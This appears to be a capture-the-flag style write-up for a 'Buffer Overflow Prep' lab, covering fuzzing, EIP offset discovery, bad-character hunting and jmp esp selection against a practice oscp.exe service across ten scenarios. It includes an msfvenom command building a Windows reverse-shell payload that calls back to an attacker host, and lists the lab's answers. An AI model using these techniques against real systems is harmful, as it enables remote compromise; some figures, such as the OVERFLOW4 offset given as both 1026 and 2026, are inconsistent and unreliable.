# Buffer Overflow Prep

In order to compromise the 10 different scenarios that are given to us by the oscp.exe executable, I programmed a set of python scripts to help me achieve this goal.

They can be consulted in my [Hack-the-Stack](https://github.com/franlupo/Hack-the-Stack) repository.

## OSCP.exe

We start by connecting to a Windows machine through RDP which has Immunity Debugger installed with mona ready for us to use.

Additionally, there is an oscp.exe executable which is the program we are going to exploit using simple stack buffer overflows. 

The program usage is quite simple, is waits for connections on port 1337. After connecting to this port we get the program's banner and we can use the HELP function to display how we can interact with the program. We get 11 options, 10 to try to exploit with a buffer overflow through the given parameter value and the EXIT option.

![image-20230317130925870](./images/image-20230317130925870.png)



That's the gist of it, let's begin!

## OVERFLOW1

There are eight steps you'll need to follow to exploit the basic BOF that you'll encounter in the OSCP exam:

0. Mona session configuration

1. Fuzzing the application parameters 

2. Consistently replicating the crash

3. Finding the offset to the EIP register

4. Controlling the EIP register

5. Expanding the space and obtaining a safe padding

6. Finding the bad characters

7. Jumping to the ESP register

8. Profit

#### 0. Mona Configuration

The "Mona" plugin for Immunity Debugger, which sets the working folder for the plugin to ``"c:\mona%p"``. The "%p" is a placeholder that gets replaced with the name of the process being debugged. This command is used to configure Mona to store its generated data (such as pattern files) in the specified working folder.

`!mona config -set workingfolder c:\mona\%p`

#### 1. Fuzzing the Application

Initially we need to find out how many bytes do we need to upload in order for the application to crash. The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. This way we will know approximately how many bytes are needed to be uploaded to the buffer for the application to crash. 

We should execute the command:

```
python 001_crash_fuzzer.py <ip> <port>
```

![image-20230317131624127](./images/image-20230317131624127.png)

Great! We can see that when uploading a string with 2000 bytes is around the threshold value needed to crash the application.

As we can see by the register values in the upper right corner and the stack in the bottom right corner we have filled both with A's.

![image-20230317131907531](./images/image-20230317131907531.png)

In fact, the reason why the application crashed is because by filling the EIP (return address) with a new value, when the program tries to access this memory address is triggers a segmentation fault because this address is outside what the program is allowed to access.

#### 2. Replicating the Crash (Optional)

We can replicate the crash with this specific number of bytes to make sure everything is working as intended.

After recording what was the buffer size that was sent when the target application crashed, let's replicate this using the `02_manual_crash.py`:

```
python 02_manual_crash.py <ip> <port> <size>
```

 ![image-20230317132416992](./images/image-20230317132416992.png)


#### 3. Finding the EIP Offset

Finding the EIP offset requires running the `003_eip_offset.py` script:

```
python 03_eip_offset.py <ip> <port> <overflow_threshold>
```

The overflow_threshold represents the number of bytes needed to crash the application.

After the application crashes once again we can check the EIP registry content a pass it to the program:

![image-20230317133025802](./images/image-20230317133025802.png)

Hence, we get the output:

![image-20230317133102634](./images/image-20230317133102634.png)

Alternatively we can also use mona to get this information using the command:
`!mona findmsp -distance <overflow_threshold>`

![image-20230317133558930](./images/image-20230317133558930.png)



**Question** What is the EIP offset for OVERFLOW1?

> 1978

We should save the **EIP offset** (1978) and the **overflow point** (2000) we used to crash the program.

#### 4. Controlling the EIP Offset

Controlling the EIP offset requires running the `004_eip_offset.py` script. This script is used just to make sure we can fill the EIP with whatever value we want, in this case 'BBBB' (42424242).

```
python 004_eip_control.py <ip> <port> <offset> <overflow_threshold>
```

The offset represent the amount of bytes the buffer has to have before reaching the Return Address.
The overflow_threshold represents the number of bytes needed to crash the application.

This script is used to verify that we have control over the EIP register. By executing this script the EIP register should be 42424242.

![image-20230317133926472](./images/image-20230317133926472.png)

Great! We have control over the EIP.

![image-20230317134008691](./images/image-20230317134008691.png)

#### 5. Finding Bad Characters

Finding bad characters requires running the `004_bad_characters.py` script several times while adding bad characters you find to the bad_characters list. This is done so that the shellcode we are going to run eventually can be interpreted correctly:

```
python 005_bad_characters.py <ip> <port> <offset> <overflow_threshold>
```

The offset represent the amount of bytes the buffer has to have before reaching the Return Address.
The overflow_threshold represents the number of bytes needed to crash the application.

In the end we are going to place shellcode that is supposed to be executed, the problem is there are some characters that cannot be interpreted and as such we have to identify those characters. Hence, we have to run this script several times each time identifying a new bad character and adding it to the array of bad characters in the script. We do this one character at a time because identifying one bad character can compromise the next byte.

**NOTE: The \x00 byte is always considered a bad character and is not being tested by my script.**

![image-20230317134451586](./images/image-20230317134451586.png)

> Note: If we try to execute the program it will fail because we are trying to upload a payload which cannot fit in 2000 bytes.
>
> â€‹	A * 1978 + B * 4 + bad_character * 255 = Minimum buffer of 2237 bytes

Luckily I tried one with 2500 bytes and tested the scripts before just to make sure there were no behavioral changes. After validating this, I ran the script and checked the stack for bad characters. We can see an example of a bad character below:

![image-20230317135149897](./images/image-20230317135149897.png)

\x07 is a bad character because it was not correctly interpreted. The stack should be read from the upper right corner to the left. Where there should be a **07** there is a **0A**. Hence, we add this byte to our bad_characters array in the code and run this script again.

![image-20230317135504215](./images/image-20230317135504215.png)

By the end of this process we will find the following bad characters: \x00\x07\x2e\xa0

**Question** In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW1?

> \x00\x07\x2e\xa0

Alternatively (preferred to hasten the process), we can first initialize a bytearray of bad chars which exclude `\x00` which is by default considered a bad character:

```
!mona bytearray -b "\x00"
```

After running our script we can use mona to find the list of bad characters.

```
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

We should not trust blindly the output of mona since we have to remember that badchars can affect the next byte as well! Hence, we should do this process one bad character at a time. This method is prefered since we do not have to go char by char to understand if it was badly interpreted. The console gives us that information already.

#### 6. Jumping to the ESP register
The mona jmp command can be used to search for jmp (or equivalent) instructions to a specific register. The jmp command will, by default, ignore any modules that are marked as aslr or rebase.

The following example searches for "jmp esp" or equivalent (e.g. call esp, push esp; retn, etc.) while ensuring that the address of the instruction doesn't contain the bad chars \x00, \x0a, and \x0d.

```
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```

![image-20230317141433809](./images/image-20230317141433809.png)

The most interesting addresses are the most with the least amount of protections in place, with the most False values.

> ASLR (Address Space Layout Randomization): ASLR is a security technique that helps prevent buffer overflow attacks by randomly arranging the memory layout of an application. This makes it harder for attackers to find and exploit vulnerabilities in an application's memory.
>
> Rebase: Rebase is a technique used to change the base address of a module in memory. This is done to make it harder for attackers to exploit memory-based vulnerabilities in the module.
>
> SAFESEH (Safe Exception Handlers): SAFESEH is a security feature in Windows that helps prevent buffer overflow attacks by verifying the integrity of exception handlers. This ensures that only valid exception handlers are executed, which helps prevent attackers from executing arbitrary code.
>
> OS This column indicates whether the memory address being referenced is valid in the current operating system or not. If the value in the "OS False" column is "False", it means that the memory address being referenced is valid in the current operating system. This is a good sign and may indicate that the address can be used to perform a successful exploit.

Alternative command:

```
!mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\x00"
```

Now we have to grab this value and save it, for example the first value `0x625011AF`.

We can test that the value is correct using:

```
python 06_jmp_esp.py <ip> <port> <offset> <overflow_threshold> <jmp_esp>
```

The jmp_esp should be written in 0x12345678 format.

> NOTE: For this script to work i commented the set timeout so that the app wouldn't crash. The reason for this is that we are going to create a breakpoint below and debug the application so that it stop right before the function returns and accesses the EIP address which will make the CPU run the JMP ESP action. If this breakpoint is reached we have successfully controlled the EIP and made it execute a custom instruction inserted by us.

![image-20230317142805497](./images/image-20230317142805497.png)

#### 7. Generate Payload

Finally, we are going to create the shellcode that will be executed using msfvenom:

```
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b " \x00\x07\x2e\xa0" -f py -v shellcode
```

After creating this shellcode we should paste it into the `07_nop_sled.py`.

This script will add the shell code and a bunch of no-operations which will sled the execution to the start of the shellcode:

![image-20230317143948825](./images/image-20230317143948825.png)

Now we just have to start a netcat listener in port 4444, in this case and execute the script.

Congratulations on performing your first buffer overflow!

## OVERFLOW2

Let's repeat this process for this case:

![image-20230317145058678](/home/kali/Desktop/pentest_walkthoughs/Machines/THM/15. BOF Prep/images/image-20230317145058678.png)

The application crashed with a payload of 700 bytes. Let's now run the manual crash with a bigger payload, to make sure we are working with enough space when we begin testing for bad characters and inserting shellcode/nops. 

![image-20230317150708557](./images/image-20230317150708557.png)



Great we now know what the offset value is for the EIP: 634

![image-20230317150936828](./images/image-20230317150936828.png)

**Question** What is the EIP offset for OVERFLOW2?

> 634

By running the script below:

![image-20230317181157523](./images/image-20230317181157523.png)

We can see that the we indeed have control over the EIP, since its value is 42424242,

![image-20230317180853639](./images/image-20230317180853639.png)



The next step is to find the list of bad characters. If you haven't already, we have to build our working directory, build the set of bad characters and launch the target application and our script. Finally, we should use mona to compare what is in the stack after the application crashes to find our first bad character:

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

From the output we can see that the first bad character after \x00, is \x23. Supposedly \x24 is also a bad character but we do not know for sure if this is the case since bad characters sometimes corrupt the next byte. Hence, let us repeat the process adding \x23 to our bad characters array.

![image-20230317181749469](./images/image-20230317181749469.png)

As we can see \x24 was not actually a bad character.

![image-20230317182051294](./images/image-20230317182051294.png)

If we follow the same logic from above, we can see that \x3c, \x83 and \xba are bad characters. Let's run the script once again, adding these values to the list so that we can check if the bytes next to them are bad characters or not.

![image-20230317182425382](./images/image-20230317182425382.png)

Great! So according to the results above we found all of the bad characters.

**Question** In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW2?

> \x00\x23\x3c\x83\xba

Our next steps would be to find the JMP ESP address using mona:

```
!mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"
```

Then we can generate the shellcode to finalize our payload (same as above) to get a shell. Since those steps are covered in OVERFLOW1 and there are no more question in THM we will move ahead to the OVERFLOW3.



### OVERFLOW3

**Fuzzer Crash**: In Overflow 3 the application crashes at 1300 bytes:

![image-20230317184443237](./images/image-20230317184443237.png)

**Manual Crash**: Once again let us bump this value to 1800 just to get enough room for our shellcode and run the next script for a manual crash:

![image-20230317184551717](./images/image-20230317184551717.png)

**Find EIP**: Great, now let's find out the EIP offset. First we run the next script with the 1800 bytes buffer and we extract the EIP value:

![image-20230317184748617](./images/image-20230317184748617.png)

Now we can insert it into the console and get the offset:

![image-20230317184647851](./images/image-20230317184647851.png)

Our offset is 1274.

**Question** What is the EIP offset for OVERFLOW3?

> 1274



**EIP Control**: Let's make sure it is correct with the next script.

![image-20230317184957889](./images/image-20230317184957889.png)

![image-20230317185022913](./images/image-20230317185022913.png)

Perfect, we crashed the application and the EIP register value is 42424242 as we defined.

**Bad Characters**: For the list of bad characters we run the commands below before the script.

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

Now we can run the script and compare the values in the stack using mona:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

![image-20230317185626662](./images/image-20230317185626662.png)

The first iteration returns these results. Following the corrupted byte next to a bad character premisse we can deduct that the first set of bad characters is: \\x11,  \x40, \x5f, \xb8 and \xee.

After adding them to the bad characters string we get the result below:

![image-20230317190125775](./images/image-20230317190125775.png)

Our list seems correct.

**Question** In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW3?

> \x00\x11\x40\x5f\xb8\xee



### OVERFLOW4

**Fuzzer Crash**: In Overflow 4 the application crashes at 2100 bytes:

![image-20230317192723022](./images/image-20230317192723022.png)

**Manual Crash**: Once again let us bump this value to 2600 just to get enough room for our shellcode and run the next script for a manual crash:

![image-20230317192749649](./images/image-20230317192749649.png)

**Find EIP**: Great, now let's find out the EIP offset. First we run the next script with the 2600 bytes buffer and we extract the EIP value:

![image-20230317193506126](./images/image-20230317193506126.png)

Now we can insert it into the console and get the offset:

![image-20230317193443189](./images/image-20230317193443189.png)

Our offset is 1026.

**Question** What is the EIP offset for OVERFLOW4?

> 2026



**EIP Control**: Let's make sure it is correct with the next script.

![image-20230317184957889](./images/image-20230317184957889.png)

![image-20230317193652332](./images/image-20230317193652332.png)

Perfect, we crashed the application and the EIP register value is 42424242 as we defined.

**Bad Characters**: For the list of bad characters we run the commands below before the script.

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

Now we can run the script and compare the values in the stack using mona:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

![image-20230317193823304](./images/image-20230317193823304.png)

The first iteration returns these results. Following the corrupted byte next to a bad character premise we can deduct that the first set of bad characters is: \\xa9,  \xcd and \xd4.

After adding them to the bad characters string we get the result below:

![image-20230317195500147](./images/image-20230317195500147.png)

Our list seems correct.

**Question** In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW4?

> \x00\xa9\xcd\xd4



### OVERFLOW5

**Fuzzer Crash**: In Overflow 5 the application crashes at 400 bytes:

![image-20230317200020545](./images/image-20230317200020545.png)

**Manual Crash**: Once again let us bump this value to 900 just to get enough room for our shellcode and run the next script for a manual crash:

![image-20230317200132580](./images/image-20230317200132580.png)

**Find EIP**: Great, now let's find out the EIP offset. First we run the next script with the 900 bytes buffer and we extract the EIP value:

![image-20230317200307286](./images/image-20230317200307286.png)

Now we can insert it into the console and get the offset:

![image-20230317200245202](./images/image-20230317200245202.png)

Our offset is 314.

**Question** What is the EIP offset for OVERFLOW5?

> 314



**EIP Control**: Let's make sure it is correct with the next script.

![image-20230317184957889](./images/image-20230317184957889.png)

![image-20230317200408018](./images/image-20230317200408018.png)

Perfect, we crashed the application and the EIP register value is 42424242 as we defined.

**Bad Characters**: For the list of bad characters we run the commands below before the script.

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

Now we can run the script and compare the values in the stack using mona:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

![image-20230317202124434](./images/image-20230317202124434.png)

The first iteration returns these results. Following the corrupted byte next to a bad character premise we can deduct that the first set of bad characters is: \\x16,  \x2f, \xf4 and \xfd.

**Question** In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW5?

> \x00\x16\x2f\xf4\xfd



### OVERFLOW6

**Fuzzer Crash**: In Overflow 6 the application crashes at 1100 bytes:

![image-20230317202439399](./images/image-20230317202439399.png)

**Manual Crash**: Once again let us bump this value to 1600 just to get enough room for our shellcode and run the next script for a manual crash:

![image-20230317202522576](./images/image-20230317202522576.png)

**Find EIP**: Great, now let's find out the EIP offset. First we run the next script with the 1600 bytes buffer and we extract the EIP value:

![image-20230317202636290](./images/image-20230317202636290.png)

Now we can insert it into the console and get the offset:

![image-20230317202616702](./images/image-20230317202616702.png)

Our offset is 1034.

**Question** What is the EIP offset for OVERFLOW6?

> 1034



**EIP Control**: Let's make sure it is correct with the next script.

![image-20230317184957889](./images/image-20230317184957889.png)

![image-20230317202737975](./images/image-20230317202737975.png)

Perfect, we crashed the application and the EIP register value is 42424242 as we defined.

**Bad Characters**: For the list of bad characters we run the commands below before the script.

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

Now we can run the script and compare the values in the stack using mona:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

![image-20230317202842964](./images/image-20230317202842964.png)

The first iteration returns these results. Following the corrupted byte next to a bad character premise we can deduct that the first set of bad characters is: \\x08,  \x2c and \xad.

**Question** In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW6?

> \x00\x08\x2c\xad





### OVERFLOW7

**Fuzzer Crash**: In Overflow 7 the application crashes at 1400 bytes:

![image-20230317203147191](./images/image-20230317203147191.png)

**Manual Crash**: Once again let us bump this value to 1900 just to get enough room for our shellcode and run the next script for a manual crash:

![image-20230317203226729](./images/image-20230317203226729.png)

**Find EIP**: Great, now let's find out the EIP offset. First we run the next script with the 1900 bytes buffer and we extract the EIP value:

![image-20230317203344450](./images/image-20230317203344450.png)

Now we can insert it into the console and get the offset:

![image-20230317203326604](./images/image-20230317203326604.png)

Our offset is 1306.

**Question** What is the EIP offset for OVERFLOW7?

> 1306



**EIP Control**: Let's make sure it is correct with the next script.

![image-20230317184957889](./images/image-20230317184957889.png)

![image-20230317203549030](./images/image-20230317203549030.png)

Perfect, we crashed the application and the EIP register value is 42424242 as we defined.

**Bad Characters**: For the list of bad characters we run the commands below before the script.

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

Now we can run the script and compare the values in the stack using mona:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

![image-20230317203644925](./images/image-20230317203644925.png)

The first iteration returns these results. Following the corrupted byte next to a bad character premise we can deduct that the first set of bad characters is: \\x8c,  \xae, \xbe and \xfb.

**Question** In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW7?

> \x00\x8c\xae\xbe\xfb



### OVERFLOW8

**Fuzzer Crash**: In Overflow 8 the application crashes at 1800 bytes:

![image-20230317203924133](./images/image-20230317203924133.png)

**Manual Crash**: Once again let us bump this value to 2300 just to get enough room for our shellcode and run the next script for a manual crash:

![image-20230317204017795](./images/image-20230317204017795.png)

**Find EIP**: Great, now let's find out the EIP offset. First we run the next script with the 2300 bytes buffer and we extract the EIP value:

![image-20230317204320743](./images/image-20230317204320743.png)

Now we can insert it into the console and get the offset:

![image-20230317204251469](./images/image-20230317204251469.png)

Our offset is 1786.

**Question** What is the EIP offset for OVERFLOW8?

> 1786



**EIP Control**: Let's make sure it is correct with the next script.

![image-20230317184957889](./images/image-20230317184957889.png)

![image-20230317204501503](./images/image-20230317204501503.png)

Perfect, we crashed the application and the EIP register value is 42424242 as we defined.

**Bad Characters**: For the list of bad characters we run the commands below before the script.

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

Now we can run the script and compare the values in the stack using mona:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

![image-20230317204605007](./images/image-20230317204605007.png)

The first iteration returns these results. Following the corrupted byte next to a bad character premise we can deduct that the first set of bad characters is: \\x1d,  \x2e, \xc7 and \xee.

**Question** In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW8?

> \x00\x1d\x2e\xc7\xee





### OVERFLOW9

**Fuzzer Crash**: In Overflow 9 the application crashes at 1600 bytes:

![image-20230317204906212](./images/image-20230317204906212.png)

**Manual Crash**: Once again let us bump this value to 2100 just to get enough room for our shellcode and run the next script for a manual crash:

![image-20230317204943465](./images/image-20230317204943465.png)

**Find EIP**: Great, now let's find out the EIP offset. First we run the next script with the 2100 bytes buffer and we extract the EIP value:

![image-20230317205046681](./images/image-20230317205046681.png)

Now we can insert it into the console and get the offset:

![image-20230317205026959](./images/image-20230317205026959.png)

Our offset is 1514.

**Question** What is the EIP offset for OVERFLOW9?

> 1514



**EIP Control**: Let's make sure it is correct with the next script.

![image-20230317184957889](./images/image-20230317184957889.png)

![image-20230317205205906](./images/image-20230317205205906.png)

Perfect, we crashed the application and the EIP register value is 42424242 as we defined.

**Bad Characters**: For the list of bad characters we run the commands below before the script.

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

Now we can run the script and compare the values in the stack using mona:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

![image-20230317205356024](./images/image-20230317205356024.png)

The first iteration returns these results. Following the corrupted byte next to a bad character premise we can deduct that the first set of bad characters is: \\x04,  \x3e and \xe1.

We should **always** (despite the fact that I have been skipping it in the last few examples) rerun the script to check if there are any more bad characters (such as the corrupted bytes).

![image-20230317205805181](./images/image-20230317205805181.png)

We can see that sneaky \x3f was also a bad character.

**Question** In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW9?

> \x00\x04\x3e\x3f\xe1





### OVERFLOW10

**Fuzzer Crash**: In Overflow 10 the application crashes at 600 bytes:

![image-20230317210000009](./images/image-20230317210000009.png)

**Manual Crash**: Once again let us bump this value to 1100 just to get enough room for our shellcode and run the next script for a manual crash:

![image-20230317210043380](./images/image-20230317210043380.png)

**Find EIP**: Great, now let's find out the EIP offset. First we run the next script with the 1100 bytes buffer and we extract the EIP value:

![image-20230317210140949](./images/image-20230317210140949.png)

Now we can insert it into the console and get the offset:

![image-20230317210127040](./images/image-20230317210127040.png)

Our offset is 537.

**Question** What is the EIP offset for OVERFLOW10?

> 537



**EIP Control**: Let's make sure it is correct with the next script.

![image-20230317184957889](./images/image-20230317184957889.png)

![image-20230317210332413](./images/image-20230317210332413.png)

Perfect, we crashed the application and the EIP register value is 42424242 as we defined.

**Bad Characters**: For the list of bad characters we run the commands below before the script.

```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
```

Now we can run the script and compare the values in the stack using mona:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a esp
```

![image-20230317210435228](./images/image-20230317210435228.png)

The first iteration returns these results. Following the corrupted byte next to a bad character premise we can deduct that the first set of bad characters is: \\xa0, \xad, \\xbe, \xde and \xef.

**Question** In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW10?

> \x00\xa0\xad\xbe\xde\xef
